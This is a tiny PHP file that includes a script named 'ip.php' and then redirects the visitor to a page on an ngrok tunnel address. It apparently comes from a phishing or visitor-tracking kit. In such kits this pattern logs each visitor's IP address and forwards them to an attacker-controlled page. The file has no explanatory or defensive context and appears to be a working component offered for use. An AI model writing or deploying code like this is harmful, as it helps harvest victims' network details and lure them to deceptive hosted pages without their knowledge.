<?php
include 'ip.php';
header('Location: https://7e338ad9.ngrok.io/index2.html');
exit
?>
